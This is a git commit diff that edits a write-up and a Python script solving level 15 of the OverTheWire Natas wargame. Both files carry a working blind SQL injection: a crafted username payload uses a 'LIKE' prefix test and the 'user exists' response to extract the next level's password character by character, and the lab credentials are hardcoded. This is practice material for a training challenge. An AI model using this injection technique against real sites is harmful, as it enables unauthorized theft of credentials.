d7a353d641e91dab78053897c519f5cf980c4811
Amethyst <productionsbyamethyst@gmail.com>
2018-09-29 18:49:10 +1000

    also fixed natas15.py

--- Natas/natas15.md
+++ Natas/natas15.md
@@ -13,7 +13,7 @@ import string
 const = ""
 for i in range(len("AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")):
   for entry in string.ascii_letters + string.digits:
-      payload = {'username': 'natas16" AND (BINARY password LIKE "{0}%" OR  BINARY password = "{0}") AND  ""="'.format(const + entry)}
+      payload = {'username': 'natas16" AND BINARY password LIKE "{0}%" AND  ""="'.format(const + entry)}
       response = requests.post('http://natas15.natas.labs.overthewire.org/', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = payload)
       # print(entry)
       if "This user exists." in response.text:
--- Natas/testing/natas15.py
+++ Natas/testing/natas15.py
@@ -3,15 +3,12 @@ import string
 
 const = ""
 for i in range(len("AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J")):
-  c = const
   for entry in string.ascii_letters + string.digits:
-      Payload = {'username': 'natas16" AND (BINARY password LIKE "{0}%" OR password = "{0}") AND  ""="'.format(const + entry)}
-      Response = requests.post('http://natas15.natas.labs.overthewire.org/', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Payload)
-      print(entry)
-      if "This user exists." in Response.text:
+      payload = {'username': 'natas16" AND BINARY password LIKE "{0}%" AND  ""="'.format(const + entry)}
+      response = requests.post('http://natas15.natas.labs.overthewire.org/', auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = payload)
+      # print(entry)
+      if "This user exists." in response.text:
         const += entry
-        print(const)
+        # print(const)
         break
-  if const == c:
-    break
 print(const)
